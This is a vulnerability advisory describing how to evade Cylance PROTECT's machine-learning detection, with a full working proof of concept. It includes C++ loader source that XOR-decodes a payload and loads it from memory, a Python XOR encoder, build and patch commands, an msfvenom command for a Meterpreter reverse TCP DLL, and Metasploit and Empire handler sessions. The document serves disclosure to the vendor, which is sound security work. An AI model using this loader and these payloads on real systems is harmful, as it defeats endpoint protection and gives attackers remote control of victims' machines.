# Memory-Based Evasion - Cylance



# Summary
Cylance mathematical model is susceptible to evasion when processing specially crafted executable files both 
pre-execution and on-execution.



## Affected Products
* Cylance PROTECT 1.2.1418.64
* Cylance PROTECT 2.0.1420.14
* Cylance V (TBD)



## Impact
Successful exploitation allows execution of arbitrary code.  However, further exploitation 
(e.g. memory-based, script-based) may be limited depending on the device agent policy.



# Vulnerability Information



## Description
A staging executable containing an encoded payload serves as a loader for the memory-based payload.  The encoder is a 
XOR-based algorithm.  Upon successful decode, the malicious executable payload (e.g. Meterpreter) is loaded from 
memory leveraging the `MemoryModule` library thereby allowing arbitrary code execution.



## Impact
Attackers may execute arbitrary code, which could then be used to conduct malicious activities.  Payload tests were 
conducted using a Metasploit Meterpreter agent and Empire Project agent.  Both tested post-exploitations using the 
available default actions (e.g. keyboard logging, screen shots, additional session-based payload).  

All possible actions and exploitation techniques were not tested, but the more common memory-based and script-based 
payloads were deterred (e.g. privilege escalation).  Due to the restrictive device agent policy, script-based and 
memory-based attacks were limited however network-based (e.g. proxying) and context-based attacks (e.g. keylogging) 
were permitted.  The possibility of further successful exploitation using `MemoryModule` cannot be ruled out.



## Details
In summary, it may be an option to (retro)fit the model for use of executable files with the attributes of the
`MemoryModule` library for pre-execution and on-execution detection.  Alternatively, it may be feasible to detect 
the malicious payload for commodity exploit modules in-memory.  Ultimately an in-memory approach for scoring
unsafe and abnormal may need to be considered. 

The Metasploit Meterpreter payload described in this advisory uses an executable file format which acts as a stager 
to download and execute a remote payload.  According to the Metasploit templates, during the initial staging on the 
target for the DLL-based payload the following occurs:
 
1. Launch a "rundll32.exe" suspended process with `CreateProcess()`
2. Get the thread context via `GetThreatContext()`
3. Shellcode is "in-lined" within the binary as an `unsigned char` with a hard-limited size 
(i.e. `#define SCSIZE 2048`).  (Note that Metasploit dynamically does the equivalent of find and replace for the 
`PAYLOAD:` prefix-tag on their included compiled binary however it is possible to provide custom template files.)  
The stager allocates the in-lined shellcode with `VirtualAllocEx()` with `PAGE_EXECUTE_READWRITE`.
4. Modify the processes instruction pointer with `WriteProcessMemory()`
5. Call `SetThreadContext()` and `ResumeThread()`, clean-up, etcetera.
6. Shellcode executes, for example, downloading the remote Meterpreter payload (i.e. metsvr.dll)
7. Following, it leverages reflective DLL injection to load itself and establish the Metasploit Meterpreter session.  

This example resembles the regurgitation of a sandbox which would certainly not be off-base if such a sandbox were 
one of the human-variety. Rest assured the author has in fact tumultuously walked the source tree of the 
Rapid7 GitHub.  Its review is certainly an exercise in coding-style-and-pattern-reversing patience.  As such, key 
sources are listed for reference and inspection.

* https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/util/exe.rb
* https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/pe/dll/template.h
* https://github.com/rapid7/metasploit-framework/blob/master/data/templates/src/pe/dll/template.c
* https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stages/multi/meterpreter.rb
* https://github.com/rapid7/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveDll.c

The Powershell Empire payload described in this advisory similarly uses an executable file format which acts as a 
stager to download and execute a remote payload.  Empire also uses a similar template style staging for the 
DLL-based payload.  In short it leverages `UnmanagedPowerShell` to dynamically load Powershell into memory and
execute arbitrary Powershell-based payloads.  An analysis of this will not be provided due to time constraints in 
researching the templating implementation.  A future version of the advisory or derivative may provide these 
details, but in lieu of such details key sources are listed for reference and inspection.

* https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py
* https://github.com/EmpireProject/Empire/blob/master/lib/stagers/dll.py
* https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick/ReflectivePick
* https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/ReflectivePick/PowerShellRunnerDll.h
* https://github.com/leechristensen/UnmanagedPowerShell
* https://msdn.microsoft.com/en-us/library/system.management.automation(v=vs.85).aspx

Hypothetically the aforementioned execution flows could serve to (retro)fit a model or perhaps a heuristic of a 
malicious payload.  This would serve as a means for improving post-exploitation protection, prevention, detection, 
etcetera.  This has not noticeably been developed in the product with the exception of the "Malicious Payload" 
memory protection.

However such may not address the evasion at its source, both pre- and post- execution, specifically the dynamic 
loading of an executable file into memory.  To better understand this process, turn to the documentation of 
`MemoryModule` to which it essentially implements the Windows PE loader such to accept memory rather than file. 
This is made evident by examining its API's.  LoadLibraryEx becomes MemoryLoadLibraryEx, etcetera.

* https://github.com/fancycode/MemoryModule/tree/master/doc

Therefore `MemoryModule`-based technique provides a means for memory-based payload execution, while the methods for
delivering the payload remain open.  The means of employing the evasion thus become an exercise of the imagination. 
For example, an image application that loads an image file, decodes a malicious payload with steganography, then 
using the technique loads the code from its memory space as described.  Or, an application that systematically reads 
its own memory for the proper sequence of bytes to construct an executable in a buffer then load the module from
memory.

One need only review the list of forks on the `MemoryModule` GitHub to begin researching other uses:

* https://github.com/fancycode/MemoryModule/network/members

As the author describes in the *Acknowledgements* section, the author independently quote/unquote "discovered" the 
evasion prior to and without knowledge of others research and development. 

In contrast, legitimate uses for the library do exist, such as the popular `Py2Exe` framework for building and 
distributing Python-based code.  This implementation has been observed by the author in popular applications such 
as Dropbox on Windows.

* http://py2exe.org/

Other indirect uses of `Py2Exe` also exist in evasion frameworks such as `Veil` but do not employ the described
evasion.

* https://github.com/Veil-Framework/Veil/search?utf8=%E2%9C%93&q=py2exe&type=

More recently however, during the prior works discovery phase of research, frameworks like `Ebowla` have emerged that 
employ the `MemoryModule` library.  See the *Acknowledgements* section.



# Additional Information



## Environment Configuration
Two agent versions were tested, versions 1.2.1418.64 and 2.0.1420.14, however the most current is listed below.

### Device
* PROTECT Agent Version 2.0.1420
* OPTICS not installed
* Agent Logging Level - Information
* Self Protection Level - Local System

### Virtual Machine
* Windows 7 Enterprise x64 SP1 (Vanilla)
* 2 processors with 4 GB RAM and 256 GB HDD
* Network adapter configured for NAT 
* VMware Tools not installed
* Windows Defender enabled
* Windows Firewall enabled with rules described below
* Test user account is member of built-in Users group

### Windows Firewall
* To restrict cloud-communication, firewall configured to block outbound traffic from Cylance binaries
```Windows Firewall Rules
netsh advfirewall firewall add rule name="%ProgramFiles%\Cylance\Desktop\LocalPkg.exe" program="%ProgramFiles%\Cylance\Desktop\LocalPkg.exe" dir=out action=block
netsh advfirewall firewall add rule name="%ProgramFiles%\Cylance\Desktop\CylanceSvc.exe" program="%ProgramFiles%\Cylance\Desktop\CylanceSvc.exe" dir=out action=block
netsh advfirewall firewall add rule name="%ProgramFiles%\Cylance\Desktop\CyProtect.exe" program="%ProgramFiles%\Cylance\Desktop\CyProtect.exe" dir=out action=block
netsh advfirewall firewall add rule name="%ProgramFiles%\Cylance\Desktop\CyUpdate.exe" program="%ProgramFiles%\Cylance\Desktop\CyUpdate.exe" dir=out action=block
netsh advfirewall firewall add rule name="%ProgramFiles%\Cylance\Desktop\CylanceUI.exe" program="%ProgramFiles%\Cylance\Desktop\CylanceUI.exe" dir=out action=block
```



## PROTECT Configuration
* Affected products were configured with the most restrictive policy settings accessible to the author's tenant
* Upload based functionality was disabled to deter cloud-based detection, and/or leaking payload and/or evasion
* Actions and settings described are those available/visible in the author's tenant; general availability and
"beta" components (e.g. "OPTICS", "Device Control") are included

### File Actions - Enabled
* File Type - Executable - Unsafe - Auto Quarantine with Execution Control
* File Type - Executable - Abnormal - Auto Quarantine with Execution Control

### File Actions - Disabled
* Auto Upload - Executable
* Policy Safe List - NONE

### Memory Actions - Enabled
* Memory Protection (master setting)

### Memory Actions - Ignore
*  NONE

### Memory Actions - Alert
*  NONE

### Memory Actions - Block
*  NONE

### Memory Actions - Terminate
* Violation Type - Exploitation - Stack Pivot
* Violation Type - Exploitation - Stack Protect
* Violation Type - Exploitation - Overwrite Code
* Violation Type - Exploitation - RAM Scraping
* Violation Type - Exploitation - Malicious Payload
* Violation Type - Process Injection - Remote Allocation of Memory
* Violation Type - Process Injection - Remote Mapping of Memory
* Violation Type - Process Injection - Remote Write to Memory
* Violation Type - Process Injection - Remote Write PE to Memory
* Violation Type - Process Injection - Remote Overwrite Code
* Violation Type - Process Injection - Remote Unmap of Memory
* Violation Type - Process Injection - Remote Thread Creation
* Violation Type - Process Injection - Remote APC Scheduled
* Violation Type - Process Injection - DYLD Injection (Mac OS X only)
* Violation Type - Escalation - LSASS Read
* Violation Type - Escalation - Zero Allocate

### Memory Actions - Disabled
* Exclude executable files (relative paths only)

### Protection Settings - Enabled
* Execution Control - Prevent service shutdown from device
* Execution Control - Kill unsafe processes and their sub processes
* Execution Control - Background Threat Detection
* Execution Control - Background Threat Detection - Run recurring
* Execution Control - Background Threat Detection - Set maximum archive file size to scan - 0 MB
* Execution Control - Background Threat Detection - Watch For New Files

### Protection Settings - Disabled
* Execution Control - Exclude Specific Folders (includes subfolders)

### Optics Settings - Enabled
* Optics (master setting)
* Set maximum device storage reserved for use by Optics (Capacity range: 500 - 1000MB) - 1000 MB

### Optics Settings - Disabled
* Threats - Auto Upload
* Memory Protection - Auto Upload
* Script Control - Auto Upload Not Available

### Optics Settings - Disabled
* Threats - Auto Upload
* Memory Protection - Auto Upload
* Script Control - Auto Upload Not Available

### Application Control - Enabled
* NONE

### Application Control - Disabled
* Application Control (master setting)

### Agent Settings - Enabled
* Enable Desktop Notifications

### Agent Settings - Disabled
* Enable auto-upload of log files

### Script Control - Enabled
* Script Control (master setting)
* Script Control - Agent Version 1370 and Below - Active Script - Block
* Script Control - Agent Version 1370 and Below - Powershell - Block
* Script Control - Agent Version 1370 and Below - Macros - N/A
* Script Control - Agent Version 1380 and Above - Active Script - Block
* Script Control - Agent Version 1380 and Above - Powershell - Block
* Script Control - Agent Version 1380 and Above - Block Powershell console usage
* Script Control - Agent Version 1380 and Above - Macros - Block
 
### Script Control - Disabled
Note: Policy details for Script Control are verbatim text and may seem inverse in logic per conventions used above.
 
* Disable Script Control - Agent version 1430 and higher - Disabled - Active Script
* Disable Script Control - Agent version 1430 and higher - Disabled - Powershell
* Disable Script Control - Agent version 1430 and higher - Disabled - Macros
* Folder Exclusions
 
### Device Control - Enabled
* NONE

### Device Control - Disabled
* Device Control (master setting)



## Reproduction

### Process
The steps to reproduce the evasion are straight-forward.   The `MemoryModule` code was primarily used for the 
proof-of-concept; this includes the library itself and minimal modifications of its examples.

The example code provided by `MemoryModule` was modified to include the XOR decoding, payload file name, and minor 
debug printing.  It was also modified to remove code that was not needed.

The XOR encoder was made in Python; simply specify the source payload (see payload details included in this advisory).

Steps to reproduce are:
1. Build `MemoryModule` using the `DllPayLoader.cpp` patch (see DLL Loader section's build guidance) 
2. Build and configure payload (e.g. see Payload details for Metasploit or Empire)
3. If applicable, further configure the payload (e.g. listeners, handlers)
4. XOR Encode the payload (e.g. `xor_payload.py msf_192-168.168-131-4444_reverse_tcp.dll`)
5. Copy the `DllPayLoader.exe` to the target
6. Copy the `payload.dll` to the target
7. Execute `DllPayLoader.exe payload.dll`
8. Observe and/or interact with payload

### Memory Module
* Clone the repository
```gitclone
git clone https://github.com/fancycode/MemoryModule MemoryModule-master
Cloning into 'MemoryModule-master'...
remote: Counting objects: 692, done.
remote: Total 692 (delta 0), reused 0 (delta 0), pack-reused 692
Receiving objects: 100% (692/692), 227.05 KiB | 0 bytes/s, done.
Resolving deltas: 100% (380/380), done.
```

* Modify `MemoryModule-master/CMakeList.txt` PLATFORM variable for target architecture
```CMakeList.txt
# Advisory specifies x86 payloads (i686)
# For x86:   set (PLATFORM "x86_64" CACHE STRING "Platform to compile for")
# For x64:   set (PLATFORM "i686" CACHE STRING "Platform to compile for")
```

```
root@kali:~/MemoryModule-master# head CMakeLists.txt 
project (MemoryModule)
cmake_minimum_required (VERSION 2.8.7)
 
set (PLATFORM "i686" CACHE STRING "Platform to compile for")
message (STATUS "Compile for ${PLATFORM} platform")
 
if (NOT MSVC)
    set (CMAKE_SYSTEM_NAME Windows)
    set (CMAKE_POSITION_INDEPENDENT_CODE False)
 
...
```

### DLL Loader
This section provides guidance for building `MemoryModule`, and minimally patching and building the
included example source files.  Bugs in original code may be reported to the `MemoryModule` author.

#### DLL PayLoader
This is available as separate file.

* DllPayLoader.cpp
```DllPayLoader.cpp
#define WIN32_LEAN_AND_MEAN
#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <assert.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <malloc.h>

#include "../../MemoryModule.h"

#define DLL_FILE TEXT(".\\payload.dll")


void* ReadLibrary(size_t* pSize) {
    size_t read;
    void* result;
    FILE* fp;

    fp = _tfopen(DLL_FILE, _T("rb"));
    if (fp == NULL)
    {
        _tprintf(_T("Can't open DLL file \"%s\"."), DLL_FILE);
        return NULL;
    }

    fseek(fp, 0, SEEK_END);
    *pSize = static_cast<size_t>(ftell(fp));
    if (*pSize == 0)
    {
        fclose(fp);
        return NULL;
    }

    result = (unsigned char *)malloc(*pSize);
    if (result == NULL)
    {
        return NULL;
    }

    fseek(fp, 0, SEEK_SET);
    read = fread(result, 1, *pSize, fp);
    fclose(fp);
    if (read != *pSize)
    {
        free(result);
        return NULL;
    }

    return result;
}


void LoadFromMemory(void)
{
    void *data;
    size_t size;
    HMEMORYMODULE handle;

    data = ReadLibrary(&size);
    if (data == NULL)
    {
        return;
    }
    
    //
    // XOR decoder
    //
    unsigned char k = ((unsigned char * ) data)[0];
    unsigned char pk;
    for (size_t i = 1; i < size; i++) {
        pk = ((unsigned char * ) data)[i];
        ((unsigned char * ) data)[i] ^= k;
        k = pk;
    }

    handle = MemoryLoadLibrary(data, size);
    if (handle == NULL)
    {
        _tprintf(_T("Can't load library from memory.\n"));
        goto exit;
    }
    
    MemoryFreeLibrary(handle);

exit:
    free(data);
}


int main()
{
    LoadFromMemory();
    return 0;
}

```

### Build
The easiest method is to `diff`  the original `example/DllLoader.cpp` with the included `DllPayLoader.cpp` to generate
a patch file.  This basically removes superfluous test code, changes the source DLL file to `payload.dll`, and adds 
the XOR decoding stub.  Then using `patch` with the generated diff file, patch the original `DllLoader.cpp` file, and 
build the source.  Depending on the Linux environment, it may be necessary to install additional packages, such as 
`build-essential`, `cmake`, or `git`.

1. Clone the repository and modify the `MemoryModule-master/CMakeList.txt` PLATFORM variable for target architecture
2. Create the patch

```
diff -u MemoryModule-master/example/DllLoader/DllLoader.cpp DllPayLoader.cpp > DllPayLoader.patch
```

3. Backup the original DllLoader example source

```
cp MemoryModule-master/example/DllLoader/DllLoader.cpp MemoryModule-master/example/DllLoader/DllLoader.cpp.bak
```

4. Patch the DllLoader example source

```
patch MemoryModule-master/example/DllLoader/DllLoader.cpp < DllPayLoader.patch
```

5. Build the entire MemoryModule source

```
cd MemoryModule-master;
cmake;
make clean;
make;
cd ..

```

6. Copy the DllLoader binary to home directory with DllPayLoader file name

```
cp MemoryModule-master/example/DllLoader/DllLoader.exe ~/DllPayLoader.exe
```
 
7. Copy to Windows system, then execute `DllPayLoader.exe payload.dll` per reproduction details

 
Alternatively, it is possible to build the modified source by creating a new directory within the `example` directory,
and modifying the `example\CMakeLists.txt` file to include the new directory.  Then, copy the proof-of-concept
source file and the `example\DllLoader\CMakeLists.txt` into the new directory.  Next, modify the 
`example\<new directory>\CMakeLists.txt` file to reference the proof-of-concept source file, modify the names to where
appropriate, and remove extraneous statements.

### Payloads 
The payload details described contain examples for x86 Windows libraries (DLL).  Host address and file names are
examples and should be modified as-needed.  The examples use the 192.168.168.131 IPv4 address.

#### Details for *Metasploit*
```msfpayload
msfvenom -p windows/meterpreter/reverse_tcp -f dll -a x86 --platform windows lhost=192.168.168.131 lport=4444 -o msf_192-168.168-131-4444_reverse_tcp.dll
```

```msfhandler
[*] Starting Metasploit Console...
                                                  
 
         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v4.14.4-dev                          ]
+ -- --=[ 1643 exploits - 1028 auxiliary - 299 post       ]
+ -- --=[ 472 payloads - 40 encoders - 9 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
 
[+] 
[+] Metasploit Pro extensions have been activated
[+] 
[*] Successfully loaded plugin: pro
msf-pro > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.168.131
lhost => 192.168.168.131
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) >  exploit
 
[*] Started reverse TCP handler on 192.168.168.131:4444 
```

#### Details for *Empire*
```empirepayload
root@kali:~/Empire# ./empire 
[*] Loading modules from: /root/Empire/lib/modules/
 
====================================================================================
 Empire: PowerShell post-exploitation agent | [Version]: 1.6.0
====================================================================================
 [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3
====================================================================================
 
   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       180 modules currently loaded

       0 listeners currently active

       0 agents currently active
 
 
(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > execute
[*] Listener 'test' successfully started.
(Empire: listeners) > usestager dll test
(Empire: stager/dll) > set Arch x86
(Empire: stager/dll) > set OutFile /root/empire_launcher.dll
(Empire: stager/dll) > execute
 
[*] Stager output written out to: /root/empire_launcher.dll
 
(Empire: stager/dll) > 
```

```empirehandler
(Empire: stager/dll) > listeners
 
[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     test              http://192.168.168.131:8080          native    5/0.0
 
(Empire: listeners) > info

Listener Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        test                             Listener name.
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  StagingKey        True        s+R?|n^&470vL$Nhap>Y9HAqE-ce2IzS Staging key for initial agent negotiation.
  Type              True        native                           Listener type (native, pivot, hop, foreign, meter).
  RedirectTarget    False                                        Listener target to redirect to for pivot/hop.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Host              True        http://192.168.168.131:8080      Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultProfile    True        /admin/get.php,/news.asp,/login/ Default communication profile for the agent.
                                process.jsp|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  Port              True        8080                             Port for the listener.
  
(Empire: listeners) > 
```

### XOR Encoder
This is available as separate file.

* xor_payload.py
```xor_payload.py
import os
import sys

__author__ = 'circasee'
__description__ = 'Simple rolling XOR encoder'

#############################################################################
def main(argv, argc):
    src = argv[1] if argc > 1 else None
    dst = 'payload.dll'
    hexdump = lambda s: '{}    {}'.format(
        ' '.join(map(lambda i: '{:02x}'.format(i), s)),
        ''.join(map(lambda i: chr(i) if i > 0x1f and i < 0x7f else '.', s))
    )
    
    if not src:
        print 'Specify a source file.'
        sys.exit(1)
    if not os.path.isfile(src):
        print 'Source is not a file.'
        sys.exit(2)
    
    print 'src =', src
    print 'dst =', dst
    print
    
    with open(src, 'rb', 0) as f:
        data = bytearray(f.read())

    print 'Before'
    print '------'
    print hexdump(data[0:16]) + '\n...\n'
    
    k = data[0]
    for i in xrange(1, len(data)):
        data[i] ^= k
        k = data[i]

    print 'After'
    print '-----'
    print hexdump(data[0:16]) + '\n...\n'
    
    
    with open(dst, 'wb', 0) as f:
        f.write(str(data))
        f.flush()

#############################################################################
if __name__ == '__main__':
    main(sys.argv, len(sys.argv))
#EOF
```



# Timeline
```advisory_timeline
* 2017-03-27 - "Discovery" of evasion technique
* 2017-03-28 - Discovery of similarly implemented evasion techniques (see *Acknowledgements*)
* 2017-04-04 - Private advisory created
* 2017-04-05 - Halted
* 2017-04-25 - Resumed
* 2017-04-25 - Private advisory completed
* 2017-04-26 - Private advisory QA
* 2017-04-27 - Vendor Notification 
```


# Acknowledgements
Much of the credit for research and development goes to author of `MemoryModule`, Joachim Bauch, who without his 
efforts this would not have been possible.  One may even go insomuch as saying credit may bestowed elsewhere however 
his library has been and will inevitably be a more valuable source to developers as its use is more main-streamed,
even though `MemoryModule` has been available since ca. 2004.

	https://github.com/fancycode/MemoryModule
	https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/

The "discovery" of this `MemoryModule`-based evasion was independently conceived by the author through use of projects 
leveraging `MemoryModule` for legitimate purposes (`py2exe` for example).  It was thus implemented in the same manner.

While the author independently "discovered" the evasion prior to and without knowledge of others research and 
development, it is inevitable others will have implemented similar if not closely mirrored memory-based evasion 
techniques in their projects prior to the author.  This especially being the case given the intent of the 
`MemoryModule` library.  This means credit given where credit due, and more impressively worth noting the fact that 
there are people of a similar security mindset.

To the authors knowledge, listed below are individuals that have employed the evasion before the author albeit without 
his knowledge.  Others likely exist and one need only research users who have forked the `MemoryModule` repository.

#### Genetic-Malware/Ebowla
Release: ca. 2016

https://github.com/Genetic-Malware/Ebowla

Twitter
* @wired33
* @midnite_runr (secretsquirrel)



# Credit
* Advisory, Analysis, Content, and Research by circasee
* See *Acknowledgements*



# EOF
Copyright © circasee MMXVII  All Rights Reserved